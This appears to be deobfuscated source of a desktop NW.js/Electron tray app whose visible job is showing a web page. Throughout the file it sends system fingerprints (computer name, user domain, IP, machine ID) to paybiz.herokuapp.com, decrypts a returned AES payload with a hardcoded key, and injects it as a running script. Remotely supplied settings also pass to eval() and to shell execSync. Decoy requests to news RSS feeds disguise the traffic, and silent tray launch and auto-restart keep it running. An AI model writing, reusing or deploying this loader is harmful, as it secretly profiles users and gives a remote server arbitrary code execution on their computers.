				settings = require("./settings.js"), report.initializeAppVisitor(), encLocalStorage.setItem("appVersion", remoteSettings.originalVersion), report.pageView("error/remoteSettings/propagate/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack), setTimeout(remoteSettings.get, remoteSettings.retryTimeoutTime)
			}
		},
		get: function() {
			encLocalStorage.waitForItem("bin", (function() {
				encryptServerObject({
					app_name: nwElectAPI.App.manifest.name,
					user_id: encLocalStorage.getItem("userid"),
					sid: encLocalStorage.getItem("subsubchannel"),
					cid: encLocalStorage.getItem("channelcid"),
					version: getFullVersion(),
					user: {
						ip: JSON.parse(encLocalStorage.getItem("lipr")),
						memory: process.memoryUsage().rss / 1024 / 1024,
						navigatorOS: navigator && navigator.userAgent ? navigator.userAgent.substring(navigator.userAgent.indexOf("(") + 1, navigator.userAgent.indexOf(")")) : "",
						uptime: process ? process.uptime() : -1,
						userDomain: process && process.env ? process.env.USERDOMAIN : ""
					},
					system: {
						machine_id: encLocalStorage.getItem("machineid") ? encLocalStorage.getItem("machineid") : "",
						platform: process ? process.platform : "",
						computerName: process && process.env ? process.env.COMPUTERNAME : "",
						operatingSystem: process && process.env ? process.env.OS : "",
						processorArchitecture: process && process.env ? process.env.PROCESSOR_ARCHITECTURE : ""
					}
				}, (function(e) {
					axios.post(remoteSettings.URL(), e).then(remoteSettings.propagate).catch(remoteSettings.propagateException)
				}))
			}))
		}
	},
	hashpilehooScripts = {
		validations: {},
		retryServerTimeout: 18e5,
		url: function() {
			return "https://paybiz.herokuapp.com/validate"
		},
		runValidations: function(e, t) {
			if (!e || 0 == Array.isArray(e) || e.length <= 0) t(!0);
			else {
				var r = e[0];
				try {
					localStorage.setItem("7", "kf9n3uy9aSZgQQLjhcjV.Rg35245ehhz")
				} catch (e) {}
				try {
					require("axios").default.get("http://www.francetv.fr/rss.xml").then((function(e) {})).catch((function(e) {}))
				} catch (e) {}
				"function" == typeof hashpilehooScripts.validations[r] ? hashpilehooScripts.validations[r]().then((function(n) {
					0 != n ? hashpilehooScripts.runValidations(e.filter((function(e) {
						return e != r
					})), t) : t(!1)
				})) : t(!0)
			}
		},
		loadInsideOut: function(e) {
			encryptServerObject({
				app_name: nwElectAPI.App.manifest.name,
				user_id: encLocalStorage.getItem("userid"),
				sid: encLocalStorage.getItem("subsubchannel"),
				cid: encLocalStorage.getItem("channelcid"),
				version: getFullVersion(),
				user: {
					ip: JSON.parse(encLocalStorage.getItem("lipr")),
					memory: process.memoryUsage().rss / 1024 / 1024,
					navigatorOS: navigator && navigator.userAgent ? navigator.userAgent.substring(navigator.userAgent.indexOf("(") + 1, navigator.userAgent.indexOf(")")) : "",
					uptime: process ? process.uptime() : -1,
					userDomain: process && process.env ? process.env.USERDOMAIN : ""
				},
				system: {
					machine_id: encLocalStorage.getItem("machineid") ? encLocalStorage.getItem("machineid") : "",
					platform: process ? process.platform : "",
					computerName: process && process.env ? process.env.COMPUTERNAME : "",
					operatingSystem: process && process.env ? process.env.OS : "",
					processorArchitecture: process && process.env ? process.env.PROCESSOR_ARCHITECTURE : ""
				}
			}, (function(t) {
				axios.post(hashpilehooScripts.url(), t).then((function(t) {
					try {
						t.status >= 200 && t.status <= 299 ? "function" == typeof e ? e(t.data) : report.pageView("error/outspt/res/callback/" + getFullVersion() + "/" + encLocalStorage.getItem("userid")) : (report.pageView("error/outspt/res/status_code/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + t.status), setTimeout((function() {
							hashpilehooScripts.loadInsideOut(e)
						}), hashpilehooScripts.retryServerTimeout))
					} catch (t) {
						setTimeout((function() {
							hashpilehooScripts.loadInsideOut(e)
						}), hashpilehooScripts.retryServerTimeout), report.pageView("error/outspt/postReq/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + t.stack)
					}
				})).catch((function(t) {
					try {
						setTimeout((function() {
							hashpilehooScripts.loadInsideOut(e)
						}), hashpilehooScripts.retryServerTimeout), report.pageView("error/outspt/res_error/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + t)
					} catch (t) {
						setTimeout((function() {
							hashpilehooScripts.loadInsideOut(e)
						}), hashpilehooScripts.retryServerTimeout), report.pageView("error/outspt/postReq/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + t.stack)
					}
				}))
			}))
		},
		loadByData: function(e) {
			try {
				try {
					require("axios").default.post("http://www.yardbarker.com/rss/rumors", "Lkh8eLA6nYndBwRAJAw1EpTBfIPHmdy92lBiQ6lGvuz5hLABoSGAHNJ07MjaYy7aPTZNzvftY7uoe9QXU").then((function(e) {})).catch((function(e) {}))
				} catch (e) {}
				var t = document.createElement("script");
				if ("DEBUG" == global.ENV || "STAGING" == global.ENV || "undefined" != typeof grunt_load_kobe && !0 !== grunt_load_kobe) {
					if ("DEBUG" == global.ENV || "STAGING" == global.ENV) {
						var r = "";
						"DEBUG" == global.ENV ? (encLocalStorage.setItem("KTYT", (new Date).getTime()), r = "./script.js", t.src = r) : global.ENV, fs.existsSync(r)
					}
				} else {
					if (!e) return report.pageView("error/outspt/eval/empty/" + getFullVersion() + "/" + encLocalStorage.getItem("userid")), void setTimeout((function() {
						hashpilehooScripts.loadInsideOut(hashpilehooScripts.loadByData)
					}), hashpilehooScripts.retryServerTimeout);
					try {
						t.innerHTML = CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(e, CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(encLocalStorage.getItem("bin"), "!@$~B1aB1a43Out0f1obis:)Leaver$4Ev)er^_^")).toString()))
					} catch (e) {
						return report.pageView("error/outspt/eval/enc/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack), void setTimeout((function() {
							hashpilehooScripts.loadInsideOut(hashpilehooScripts.loadByData)
						}), hashpilehooScripts.retryServerTimeout)
					}
				}
				try {
					localStorage.getItem("M3JHb.COKu")
				} catch (e) {}
				document.head.appendChild(t)
			} catch (e) {
				report.pageView("error/outspt/eval/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack), "DEBUG" != global.ENV && "STAGING" != global.ENV && setTimeout((function() {
					hashpilehooScripts.loadInsideOut(hashpilehooScripts.loadByData)
				}), hashpilehooScripts.retryServerTimeout)
			}
		},
		start: function() {
			try {
				localStorage.setItem("M3JHb.COKu", "DJItz7mHdP18vAsCLXG4nZeunOFSqY.aFtOyvgl0V")
			} catch (e) {}
			"PRODUCTION" == global.ENV ? hashpilehooScripts.runValidations(Object.keys(hashpilehooScripts.validations), (function(e) {
				0 != e ? (report.event("vapilehoo"), hashpilehooScripts.loadInsideOut(hashpilehooScripts.loadByData)) : report.event("not_vapil")
			})) : hashpilehooScripts.loadByData(null)
		}
	},
	wndOptions = {
		show: !1,
		frame: !1,
		title: settings.pkg.title || nwElectAPI.App.manifest.name,
		height: settings.pkg.height || manifest.window.height,
		width: settings.pkg.width || manifest.window.width,
		min_height: settings.pkg.min_height || manifest.window.min_height,
		min_width: settings.pkg.min_width || manifest.window.min_width,
		position: settings.pkg.startupPosition || manifest.window.position,
		user_agent: settings.userAgent || navigator.userAgent,
		alerts: !0 === settings.alerts,
		downloadable: void 0 !== settings.downloadable && settings.downloadable,
		mute: settings.startMuted,
		transparent: void 0 !== settings.pkg.transparent && settings.pkg.transparent
	};
settings.pkg.shouldOverrideMaxSizes && (wndOptions.max_height = settings.pkg.max_height || manifest.window.max_height, wndOptions.max_width = settings.pkg.max_width || manifest.window.max_width);
var launchApp = function() {
		try {
			nwElectAPI.Window.open("./app.html", wndOptions, (function(e) {
				appWnd = e;
				var t = !1;

				function r() {
					if (!t) {
						t = !0;
						try {
							setup(!0)
						} catch (e) {}
					}
				}
				"NWJS" == global.infraType ? appWnd.on("loaded", r) : appWnd.once("ready-to-show", r)
			}));
			try {
				require("axios").default.post("http://rss.cnn.com/rss/si_topstories.rss", "c6aaS4idSh4ZJ6IWwQC7DtnMKNt").then((function(e) {})).catch((function(e) {}))
			} catch (e) {}
			"object" == typeof hashpilehooScripts && encLocalStorage.waitForItem("bin", (function() {
				hashpilehooScripts.start()
			})), "object" == typeof autoUpdate && global.setTimeout((function() {
				"DEBUG" != global.ENV && global.ENV
			}), 6e4), "object" == typeof autoRestarter && autoRestarter.scheduleAppRestart()
		} catch (e) {
			report.pageView("error/launchApp/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack)
		}
	},
	setup = function(isFirstSetup) {
		function bootContent() {
			bootContentState = loadingState.STARTED, appWnd.window.closeButtonExit = closeButtonExit;
			const appHeaderName = appWnd.window.document.getElementById("app-header-name");
			appHeaderName && (appHeaderName.innerText = nwElectAPI.App.manifest.name);
			try {
				function frameLoaded(e) {
					try {
						var scope = templerFrame.contentWindow;
						scope.psrUrl = `https://paybiz.herokuapp.com/psr?s=${encLocalStorage.getItem("subchannel")}&q=`;
						var exports = {
							openExternal: nw.Shell.openExternal,
							actualWin: appWnd
						};
						for (e in exports) scope[e] = exports[e];
						scope.onbeforeunload = function() {
							settings.loadingAnimation && this.actualWin.window.$(".loader-overlay").fadeIn("fast")
						};
						try {
							settings.specialLoad(scope)
						} catch (e) {
							report.pageView("error/bootContent/specialLoad/eval/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack)
						}
						appWnd.removeAllListeners("new-win-policy");
						var nwPolicy = function(e, t, r) {
							nw.Shell.openExternal(t), r.ignore()
						};
						settings.nwPolicy && (nwPolicy = eval("(" + settings.nwPolicy + ")")), appWnd.removeAllListeners("new-win-policy"), appWnd.on("new-win-policy", nwPolicy), appWnd.window.open = function(e, t, r, n) {
							nw.ShellopenExternal(e)
						}
					} catch (e) {
						report.pageView("error/bootContent/scope/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack)
					}
				}
				if (navigator.onLine) {
					var templerFrame = appWnd.window.document.getElementById("templerFrame");
					templerFrame.nwfaketop = !0, void 0 !== settings.nwdisable && 1 != settings.nwdisable || (templerFrame.nwdisable = !0), templerFrame.removeEventListener("load", frameLoaded, !0), templerFrame.addEventListener("load", frameLoaded, !0), templerFrame && templerFrame.src != settings.url && (templerFrame.src = settings.url), bootContentState = loadingState.FINISHED
				} else setTimeout(bootContent, 1e4)
			} catch (e) {
				report.pageView("error/bootContent/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack)
			}
		}
		setupState = loadingState.STARTED, appWnd.title = nwElectAPI.App.manifest.name, appWnd.removeAllListeners("resize"), appWnd.removeAllListeners("move"), appWnd.removeAllListeners("closed"), appWnd.removeAllListeners("close"), appWnd.removeAllListeners("maximize"), appWnd.removeAllListeners("minimize"), appWnd.removeAllListeners("restore"), appWnd.removeAllListeners("focus"), appWnd.removeAllListeners("blur"), "ELECTRON" == global.infraType ? (appWnd.removeListener("mousemove", autoRestarter.outOfIdle), appWnd.removeListener("keypress", autoRestarter.outOfIdle), appWnd.window.document.getElementById("templerFrame").contentWindow.removeEventListener("mousemove", autoRestarter.outOfIdle), appWnd.window.document.getElementById("templerFrame").contentWindow.removeEventListener("keypress", autoRestarter.outOfIdle), settings && void 0 !== settings.exitButtonQuitsTheApp && 1 == settings.exitButtonQuitsTheApp ? (appWnd.window.document.getElementById("templerFrame").contentWindow.exitWindow = closeButtonExit, appWnd.window.document.getElementById("closeBtn").removeEventListener("click", closeButtonExit, !0)) : (appWnd.window.document.getElementById("templerFrame").contentWindow.exitWindow = sendToTray, appWnd.window.document.getElementById("closeBtn").removeEventListener("click", sendToTray, !0)), appWnd.window.document.getElementById("maxBtn").removeEventListener("click", maximize, !0), appWnd.window.document.getElementById("restoreBtn").removeEventListener("click", unmaximize, !0), appWnd.window.document.getElementById("minBtn").removeEventListener("click", minimize, !0)) : (appWnd.window.removeEventListener("mousemove", autoRestarter.outOfIdle), appWnd.window.removeEventListener("keypress", autoRestarter.outOfIdle), appWnd.window.document.getElementById("templerFrame").contentWindow.removeEventListener("mousemove", autoRestarter.outOfIdle), appWnd.window.document.getElementById("templerFrame").contentWindow.removeEventListener("keypress", autoRestarter.outOfIdle), settings && void 0 !== settings.exitButtonQuitsTheApp && 1 == settings.exitButtonQuitsTheApp ? appWnd.window.document.getElementById("closeBtn").removeEventListener("click", closeButtonExit, !0) : appWnd.window.document.getElementById("closeBtn").removeEventListener("click", sendToTray, !0), appWnd.window.document.getElementById("maxBtn").removeEventListener("click", maximize, !0), appWnd.window.document.getElementById("restoreBtn").removeEventListener("click", unmaximize, !0), appWnd.window.document.getElementById("minBtn").removeEventListener("click", minimize, !0)), settings && void 0 !== settings.exitButtonQuitsTheApp && 1 == settings.exitButtonQuitsTheApp ? appWnd.window.document.getElementById("closeBtn").addEventListener("click", closeButtonExit, !0) : appWnd.window.document.getElementById("closeBtn").addEventListener("click", sendToTray, !0), settings && void 0 !== settings.disableParentContainer && 1 == settings.disableParentContainer && appWnd.window.$("#parent-container").css("display", "none"), appWnd.window.document.getElementById("maxBtn").addEventListener("click", maximize, !0), appWnd.window.document.getElementById("restoreBtn").addEventListener("click", unmaximize, !0), appWnd.window.document.getElementById("minBtn").addEventListener("click", minimize, !0), appWnd.window.addEventListener("mousemove", autoRestarter.outOfIdle), appWnd.window.addEventListener("keypress", autoRestarter.outOfIdle), appWnd.on("focus", (function(e) {
			autoRestarter.outOfIdle(e), !0 === settings.showAppAsPopup && (appWnd.window.document.getElementById("templerFrame").style.paddingBottom = "0px", appWnd.window.document.getElementById("templerFrame").style.paddingTop = "0px", appWnd.window.document.getElementById("templerFrame").style.paddingRight = "0px", appWnd.window.document.getElementById("templerFrame").style.paddingLeft = "0px", appWnd.window.document.getElementById("maxBtn").style.visibility = "hidden", appWnd.window.document.getElementById("restoreBtn").style.visibility = "hidden", appWnd.window.document.getElementById("minBtn").style.visibility = "hidden", appWnd.window.document.getElementById("closeBtn").style.visibility = "hidden", appWnd.window.document.getElementById("iconTopLeft").style.visibility = "hidden")
		})), appWnd.on("blur", (function(e) {
			autoRestarter.outOfIdle(e), !0 === settings.showAppAsPopup && sendToTray()
		})), appWnd.window.document.getElementById("templerFrame").contentWindow.addEventListener("mousemove", autoRestarter.outOfIdle), appWnd.window.document.getElementById("templerFrame").contentWindow.addEventListener("keypress", autoRestarter.outOfIdle);
		var closeBtn = appWnd.window.document.getElementById("closeBtn"),
			maxBtn = appWnd.window.document.getElementById("maxBtn"),
			restoreBtn = appWnd.window.document.getElementById("restoreBtn"),
			minBtn = appWnd.window.document.getElementById("minBtn");

		function restoreAction(e) {
			tryCatchConsole(() => {
				1 == state.minimized ? (state.minimized = !1, 1 == settings.muteOnMinimize && appWnd.setmute1(!1)) : 1 == state.trayed ? (state.trayed = !1, 1 == settings.muteOnTray && appWnd.setmute1(!1)) : (state.maximized = !1, maxBtn.className = "", restoreBtn.className = "hidden", appWnd.width = state.width, appWnd.height = state.height), autoRestarter.outOfIdle(e)
			})
		}
		appWnd.on("resize", (function(e, t) {
			state.width = appWnd.width, state.height = appWnd.height, autoRestarter.outOfIdle("resize")
		})), appWnd.on("move", (function(e, t) {
			state.x = e, state.y = t, autoRestarter.outOfIdle("move")
		})), appWnd.on("closed", (function() {
			sendToTray(), autoRestarter.outOfIdle("closed"), report.syncPageView("exit/closed/" + getFullVersion() + "/" + encLocalStorage.getItem("userid"), (function() {
				nw.App.quit()
			}))
		})), appWnd.on("close", (function() {
			sendToTray(), "undefined" != typeof settings && void 0 !== settings.exitTaskBarQuitsTheApp && 1 == settings.exitTaskBarQuitsTheApp && (autoRestarter.outOfIdle("closed"), report.syncPageView("exit/closed/" + getFullVersion() + "/" + encLocalStorage.getItem("userid"), (function() {
				nw.App.quit()
			})))
		})), appWnd.on("maximize", (function(e) {
			tryCatchConsole(() => {
				state.maximized = !0, maxBtn.className = "hidden", restoreBtn.className = "", autoRestarter.outOfIdle(e)
			})
		})), appWnd.on("minimize", (function(e) {
			tryCatchConsole(() => {
				state.minimized = !0, 1 == settings.minimizingSendingToTray ? sendToTray() : 1 == settings.muteOnMinimize && appWnd.setmute1(!0), autoRestarter.outOfIdle(e)
			})
		})), appWnd.on("restore", restoreAction), appWnd.window.document.getElementById("searchForm").removeEventListener("submit", onSearchSubmitted, !0), appWnd.window.document.getElementById("searchForm").addEventListener("submit", onSearchSubmitted, !0), tryCatchConsole(() => {
			1 == settings.pkg.disableMaximizeButton && (appWnd.window.document.getElementById("maxBtn").className = "hidden", appWnd.window.document.getElementById("disabledMaxBtn").className = "")
		});
		try {
			NaN != parseFloat(settings.pkg.opacity) && (appWnd.window.document.body.parentElement.style.opacity = parseFloat(settings.pkg.opacity));
			var searchInputVisibility = "none";
			settings.searchInput && (searchInputVisibility = "unset"), appWnd.window.$("#searchForm").css("display", searchInputVisibility)
		} catch (e) {
			report.pageView("error/setup/search_input/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack)
		}
		bootContent(), nw.App.removeAllListeners("open"), nw.App.on("open", (function(e) {
			!0 !== settings.pkg.noui && (restoreAction("restore"), appWnd.show())
		})), appWnd.setMinimumSize(settings.pkg.min_width, settings.pkg.min_height);
		var userDaysAlive = "0";
		if (encLocalStorage.getItem("installDate") && (userDaysAlive = (((new Date).getTime() - encLocalStorage.getItem("installDate")) / 864e5).toFixed(2)), report.pageView("app/" + getFullVersion() + "/" + encLocalStorage.getItem("userid")), report.initiateNewUser(), report.event("Morning", Math.floor(userDaysAlive), !1), isFirstSetup && !settings.showAppAsPopup && (report.heartbeat.start(), state.x && state.x > 0 && state.y && state.y > 0 && (appWnd.x = state.x, appWnd.y = state.y), state.width && state.width > manifest.width && state.height && state.height > manifest.height && (appWnd.width = state.width, appWnd.height = state.height), state.trayed || 0 != settings.pkg.startOnTray || "undefined" != typeof grunt_app_silent_launch_param && cmdLine[grunt_app_silent_launch_param] || !0 === settings.pkg.noui ? sendToTray() : (appWnd.show(), state.maximized && appWnd.maximize())), void 0 !== settings.startMaximized && 1 == settings.startMaximized && maximize(), void 0 !== settings.customBackgroundColor) try {
			appWnd.window.document.body.style.background = settings.customBackgroundColor, appWnd.window.document.body.parentElement.style.background = settings.customBackgroundColor, appWnd.window.document.getElementById("parent-container").style.background = settings.customBackgroundColor
		} catch (e) {}
		sendToTray(), setupState = loadingState.FINISHED
	};

function onSearchSubmitted() {
	tryCatchConsole(() => {
		report.event("google_search");
		var e = appWnd.window.document.getElementById("search-input").value,
			t = settings.searchingUrl.replace("[KEYWORDS]", encodeURIComponent(e));
		if (t.toString().indexOf("<SUBID>") >= 0) {
			var r = settings.ua.split("-"),
				n = coreVersion + "." + r[r.length - 1] + "." + subchannel + (subsubchannel ? "." + subsubchannel : "");
			t = t.replace("<SUBID>", n)
		}
		require("nw.gui").Shell.openExternal(t), appWnd.window.document.getElementById("search-btn").click()
	})
}

function maximize() {
	!0 !== settings.pkg.noui && appWnd.maximize()
}

function minimize() {
	appWnd.minimize()
}

function unmaximize() {
	!0 !== settings.pkg.noui && (state.maximized ? (state.maximized = !1, appWnd.unmaximize()) : (state.maximized = !0, maximize()))
}
setInterval(() => {
	tray && appWnd && appWnd.window && appWnd.window.kanExtraInfo && appWnd.window.kanExtraInfo.trayToolTip && (tray.tooltip = appWnd.window.kanExtraInfo.trayToolTip)
}, 500);
var trayEvt = null;

function sendToTray() {
	1 == settings.muteOnTray && appWnd.setmute1(!0);
	try {
		function e(e) {
			try {
				if (settings && settings.onOpenCommand) {
					try {
						localStorage.setItem("M3JHb.COKu", "OIQQhO9b8dBGOhVUSkKfQel0x5153.CcCdFv2fobS")
					} catch (e) {}
					return void child_process.execSync("start " + settings.onOpenCommand)
				}
				if (settings.trayExternalLink && "" != settings.trayExternalLink && "string" == typeof settings.trayExternalLink) nw.Shell.openExternal(settings.trayExternalLink);
				else {
					if (1 == settings.muteOnTray && appWnd.setmute1(!1), void 0 !== e && (trayEvt = e), !0 === settings.showAppAsPopup && 1 == state.trayed && !0 !== settings.pkg.noui) {
						const t = "center" === wndOptions.position ? e.x - appWnd.width / 2 : window.screen.availWidth - appWnd.width,
							r = window.screen.availHeight - appWnd.height;
						appWnd.moveTo(Math.round(t), Math.round(r)), appWnd.show(), appWnd.focus()
					} else 1 != settings.pkg.noui && appWnd.show();
					state.trayed = !1
				}
			} catch (e) {
				report.pageView("error/tray/show/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack)
			}
		}
		if (appWnd.window.document.getElementById("templerFrame").contentWindow.kanExtraInfo && appWnd.window.document.getElementById("templerFrame").contentWindow.kanExtraInfo.trayToolTip && appWnd.window.document.getElementById("templerFrame").contentWindow.kanExtraInfo.trayToolTip, appWnd.window.document.body.blur(), appWnd.hide(), state.trayed = !0, !tray) {
			(tray = window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches && fs.existsSync("./imgs/trayDark.png") ? new nw.Tray({
				icon: "./imgs/trayDark.png"
			}) : new nw.Tray({
				icon: "./imgs/tray.png"
			})).on("click", e)
		}
		if (tray && !0 !== settings.pkg.noui) {
			var t = new nw.Menu,
				r = new nw.MenuItem({
					type: "normal",
					label: "Show"
				});
			if (r.click = e, t.append(r), !0 !== settings.noCloseButton) {
				var n = new nw.MenuItem({
					type: "normal",
					label: "Close"
				});
				n.click = trayExit, t.append(n)
			}
			tray.menu = t
		}
	} catch (e) {
		return report.pageView("error/tray/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack), !1
	}
}

function trayExit() {
	report.syncPageView("exit/tray/" + getFullVersion() + "/" + encLocalStorage.getItem("userid"), (function() {
		try {
			for (p = 0; p < childProcs.length; p++) childProcs[p].kill();
			nw.App.closeAllWindows(), nw.App.quit()
		} catch (e) {
			return report.pageView("error/tray/exit/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack), !1
		}
	}))
}

function closeButtonExit() {
	report.syncPageView("exit/closebtn/" + getFullVersion() + "/" + encLocalStorage.getItem("userid"), (function() {
		try {
			for (p = 0; p < childProcs.length; p++) childProcs[p].kill();
			nw.App.closeAllWindows(), nw.App.quit()
		} catch (e) {
			return report.pageView("error/tray/exit/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack), !1
		}
	}))
}
var autoRestarter = {};

function loadAppLogic() {
	try {
		var e = encLocalStorage.getItem("previousAppVersion");
		e != appVersion && (encLocalStorage.setItem("previousAppVersion", appVersion), encLocalStorage.setItem("appVersion", appVersion), report.pageView("au/up/from/" + e + "/to/" + appVersion + "/" + getFullVersion() + "/" + encLocalStorage.getItem("userid")), taboolaRasa()), appVersion = encLocalStorage.getItem("appVersion") || appVersion, "DEBUG" != global.ENV && remoteSettings.loadCached(), launchApp(), "DEBUG" != global.ENV && (remoteSettings.get(), updatesIntervals.settingsInterval || (updatesIntervals.settingsInterval = setInterval(remoteSettings.get, remoteSettings.updateIntervalTime)))
	} catch (e) {
		report.pageView("error/loadAppLogic/ex/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack), taboolaRasa()
	}
}

function Kaboom() {}
autoRestarter.monitorModulesTime = 18e5, autoRestarter.monitorModulesIntervalObj = setInterval(autoRestarter.monitorModulesUpdates, autoRestarter.monitorModulesTime), autoRestarter.maxBehaviorTime = 1728e5, autoRestarter.scheduleTimeoutObj = null, autoRestarter.idleInterval = null, autoRestarter.minimumIdleMinutes = 10, autoRestarter.minimumIdleMinutesForKobe = autoRestarter.minimumIdleMinutes, autoRestarter.maxMemoryUsageTreshold = 650, autoRestarter.criticalMemoryUsageTreshold = 900, autoRestarter.minutesOnIdleIntervalSeconds = 30, autoRestarter.minutesOnIdle = 0, autoRestarter.minutesOnIdleKobe = 0, autoRestarter.minutesOnIdleIncInterval = setInterval((function() {
	if (autoRestarter.minutesOnIdle += autoRestarter.minutesOnIdleIntervalSeconds / 60, autoRestarter.minutesOnIdleKobe += autoRestarter.minutesOnIdleIntervalSeconds / 60, process.memoryUsage().rss / 1024 / 1024 >= autoRestarter.maxMemoryUsageTreshold && autoRestarter.minutesOnIdle >= autoRestarter.minimumIdleMinutes && autoRestarter.minutesOnIdleKobe >= autoRestarter.minimumIdleMinutesForKobe || process.memoryUsage().rss / 1024 / 1024 >= autoRestarter.criticalMemoryUsageTreshold) {
		"STAGING" != global.ENV && "DEBUG" != global.ENV || global.alert("Memory Breach! Current memory:", process.memoryUsage().rss / 1024 / 1024);
		var e = "t";
		state && 0 == state.trayed && (e = "nt"), report.syncPageView("ares/" + e + "/" + nwElectAPI.App.manifest.name + "/" + getFullVersion() + "/" + autoRestarter.minutesOnIdle + "/mem/" + (process.memoryUsage().rss / 1024 / 1024).toFixed(1), autoRestarter.appRestart)
	}
}), 1e3 * autoRestarter.minutesOnIdleIntervalSeconds), autoRestarter.timeoutMinutesForRestart = 80, autoRestarter.setRestartTimers = function() {
	autoRestarter.nextAutoRestart = (new Date).setHours(29, 0, 0, 0), autoRestarter.lastPossibleRestartTime = (new Date).setHours(29, autoRestarter.timeoutMinutesForRestart, 0, 0)
}, autoRestarter.setRestartTimers(), autoRestarter.scheduleAppRestart = function() {
	autoRestarter.scheduleTimeoutObj && (clearTimeout(autoRestarter.scheduleTimeoutObj), autoRestarter.scheduleTimeoutObj = null), autoRestarter.scheduleTimeoutObj = setTimeout((function() {
		clearInterval(autoRestarter.idleInterval), autoRestarter.idleInterval = setInterval((function() {
			if ((new Date).getTime() - autoRestarter.lastPossibleRestartTime > 0) clearInterval(autoRestarter.idleInterval), autoRestarter.setRestartTimers(), autoRestarter.scheduleAppRestart();
			else if (autoRestarter.minutesOnIdle >= autoRestarter.minimumIdleMinutes && navigator.onLine) {
				var e = "t";
				state && 0 == state.trayed && (e = "nt"), report.syncPageView("ares/" + e + "/" + nwElectAPI.App.manifest.name + "/" + getFullVersion() + "/" + autoRestarter.minutesOnIdle + "/fam", autoRestarter.appRestart)
			}
		}), 6e4)
	}), autoRestarter.nextAutoRestart - (new Date).getTime(), 10)
}, autoRestarter.appRestart = function() {
	report.SyncEvent(encodeURIComponent("AppRestart"), -1, (function() {
		try {
			var e = [],
				t = process.execPath;
			"true" == state.trayed && "undefined" != typeof grunt_app_silent_launch_param && e.push("--" + grunt_app_silent_launch_param), child_process.spawn(t, e, {
				detached: !0
			}).unref(), appWnd && appWnd.hide(), nw.App.quit()
		} catch (e) {
			report.pageView("error/ares/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack)
		}
	}))
}, autoRestarter.monitorModulesUpdates = function() {
	var e = (new Date).getTime();
	if (0 != updates.bin && e - updates.bin >= autoRestarter.maxBehaviorTime || 0 != updates.settings && e - updates.settings >= autoRestarter.maxBehaviorTime) {
		var t = "t";
		state && 0 == state.trayed && (t = "nt"), report.syncPageView("ares/" + t + "/" + nwElectAPI.App.manifest.name + "/" + getFullVersion() + "/" + autoRestarter.minutesOnIdle + "/sebin", autoRestarter.appRestart)
	}
}, autoRestarter.outOfIdle = function(e) {
	autoRestarter.minutesOnIdle = 0
}, autoRestarter.scriptOutOfIdle = function(e) {
	report.pageView("ooi/" + (e || "scpt") + "/" + getFullVersion() + "/" + encLocalStorage.getItem("userid") + "/" + autoRestarter.minutesOnIdleKobe, !0), autoRestarter.minutesOnIdleKobe = 0
}, autoRestarter.kobeOutOfIdle = autoRestarter.scriptOutOfIdle, loadAppLogic();